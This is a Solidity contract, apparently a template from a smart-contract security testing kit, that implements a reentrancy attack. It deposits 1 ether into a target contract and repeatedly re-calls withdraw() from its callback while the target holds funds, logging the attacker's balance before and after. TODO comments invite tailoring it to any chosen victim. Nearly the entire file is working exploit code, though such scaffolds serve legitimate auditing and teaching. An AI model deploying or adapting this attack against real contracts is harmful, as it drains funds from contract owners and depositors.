pragma solidity ^0.8.13;

import "../Reentrancy.sol";

import "forge-std/console.sol";

contract ReentrancyExampleAttack is Reentrancy {
    // The victim to perform reentrancy attack on
    address target;

    /**
     * @param victim The address of the contract to perform reentrancy on
     */
    constructor(address victim) {
        target = victim;
    }

    /**
     * @dev Initiates the reentrancy attack. Make any calls to the target contract, and continue reentrancy attack in the below callback function
     */
    function initiateAttack() external {
        // Initiate call to the target contract
        // Interface(target).someFunction();
        console.log("Initiating attack on %s", target);
        console.log("Attacker balance before %s", address(this).balance);

        // TODO: Modify the attack here to initiate reentrancy in your victim
        target.call{value: 1 ether}(abi.encodeWithSelector(bytes4(keccak256("deposit()"))));
        target.call(abi.encodeWithSelector(bytes4(keccak256("withdraw()"))));
    }

    /**
     * @dev Function run the first time the callback is entered
     * @dev msg.sender will be the victim contract
     * @dev msg.sig can be used to identify which callback triggered the reentrancy eg. msg.sig == this.onTokenTransfer.selector
     */
    function _executeAttack() internal override {
        // TODO: Modify the attack here
        if (target.balance >= 1 ether) {
            target.call(abi.encodeWithSelector(bytes4(keccak256("withdraw()"))));
        }
    }

    /**
     * @dev Function run after the attack is executed
     */
    function _completeAttack() internal override {
        console.log("Attacker balance after %s", address(this).balance);

        // TODO: Modify the attack cleanup here
    }

    /**
     * @dev Function run when target contract makes external call back to attack contract
     */
    function _reentrancyCallback() internal override incrementState {
        console.log("\n>>> Begin reentrancy stage %s", uint256(reentrancyStage));
        if (reentrancyStage == State.ATTACK) {
            // Execute attack
            console.log("\n>>> Execute attack");
            _executeAttack();
        } else if (reentrancyStage == State.POST_ATTACK) {
            // Already ran the attack once
            console.log("\n>>> Attack completed successfully");
            _completeAttack();
        } else {
            // No state defined
        }
    }

    modifier incrementState() {
        reentrancyStage = State(uint256(reentrancyStage) + 1);
        _;
    }
}
